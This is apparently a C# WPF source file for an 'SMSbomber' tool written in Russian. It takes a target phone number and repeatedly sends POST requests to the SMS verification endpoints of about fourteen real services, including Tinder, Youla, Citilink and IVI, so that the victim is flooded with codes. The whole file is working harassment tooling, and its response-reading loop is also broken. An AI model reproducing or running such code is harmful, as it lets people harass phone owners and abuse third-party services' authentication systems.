using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using System.Net;

namespace SMSbomber
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            for (int i = 1; i < 20; i++)
                cbNumber.Items.Add(i);
            tbNumber.MaxLength = 10;
        }

        private void tbNumber_PreviewTextInput(object sender, TextCompositionEventArgs e)
        {
            e.Handled = "0123456789".IndexOf(e.Text) < 0;
        }

        private static string Post(string Url, string Data)
        {
            WebRequest req = WebRequest.Create(Url);
            req.Method = "POST";
            req.Timeout = 10000;
            req.ContentType = "application/x-www-form-urlencoded";
            byte[] sentData = Encoding.GetEncoding(1251).GetBytes(Data);
            req.ContentLength = sentData.Length;
            Stream sendStream = req.GetRequestStream();
            sendStream.Write(sentData, 0, sentData.Length);
            sendStream.Close();
            WebResponse res = req.GetResponse();
            Stream ReceiveStream = res.GetResponseStream();
            StreamReader sr = new StreamReader(ReceiveStream, Encoding.UTF8);
            Char[] read = new char[256];
            int count = sr.Read(read, 0, 256);
            string Out = String.Empty;
            while(count > 0)
            {
                String str = new string(read, 0, 256);
            }
            return Out;
        }

        public void Send(string adress, string mask, string name)
        {
            try
            {
                string Answer = Post(adress, mask);
                tbLog.AppendText($"С помощью {name} посылочка улетела\n");
            }
            catch
            {
                tbLog.AppendText($"No bro , {name} не смог\n");
            }
        }

        private void bt1_Click(object sender, RoutedEventArgs e)
        {
            string number = tbNumber.Text;
            for (int i = 0; i < int.Parse(cbNumber.Text); i++)
            {
                Send("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", $"phone_number =+7{number}", "Tinder");
                Send("https://app.karusel.ru/api/v1/phone/", $"phone=8{number}", "Карусель");
                Send("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", $"phone=7{number}", "Qlean");
                Send("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", $"phone=7{number}", "AT PRIME");
                Send("https://youla.ru/web-api/auth/request_code", $"phone=+7{number}", "Юла");
                Send($"https://www.citilink.ru/registration/confirm/phone/+ 7{number}/", $"", "CityLink");
                Send("https://api.sunlight.net/v3/customers/authorization/", $"phone=7{number}", "SunLight");
                Send("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", $"passwordd=ctclutctc&application=lkp&login=+7{number}", "Invitro");
                Send("https://api.delitime.ru/api/v2/signup", $"SignupForm[username]=7{number}&SignupForm[device_type]=3", "DeliMobil");
                Send("https://api.mtstv.ru/v1/users", $"msidn=7{number}", "MTC");
                Send("https://moscow.rutaxi.ru/ajax_keycode.html", $"1={number}", "Rutaxi");
                Send("https://www.icq.com/smsreg/requestPhoneValidation.php", $"msidn=7{number}&locale=en&countryCode=re&version=1&k"+
                    $"=ic1rtwz1s1Hj100r&r=46763", "ICQ");
                Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"mode=request&phone =+7{number}&phone_permission=unknown&stream"+
                    $"_id=0&v=3&appversion=3.20.6&osversion=unknown&devicemodel=unknown", "InDriver");
                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone=7{number}", "IVI");
            }
        }
    }
}
